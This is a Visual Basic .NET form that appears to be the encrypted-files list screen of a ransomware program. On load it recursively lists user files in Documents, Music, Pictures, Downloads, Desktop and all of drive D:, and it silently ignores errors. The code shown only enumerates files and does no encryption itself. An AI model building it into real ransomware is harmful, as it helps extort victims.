Public Class Form3
    Private Sub Encryptedfiles_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            For Each foundDirectory As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyDocuments,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(
            foundDirectory)
                    If foundFile.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile2 As String In My.Computer.FileSystem.GetFiles(
          My.Computer.FileSystem.SpecialDirectories.MyDocuments)

                If foundFile2.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile2)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyMusic,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyMusic)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyPictures,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyPictures)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception
        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Downloads",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                         "C:\Users\" + Environment.UserName + "\Downloads",
                        FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
                 foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Downloads")

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Desktop",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                              "C:\Users\" + Environment.UserName + "\Desktop",
                             FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
           foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Desktop")
                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "D:\",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Me.Hide()
    End Sub
End Class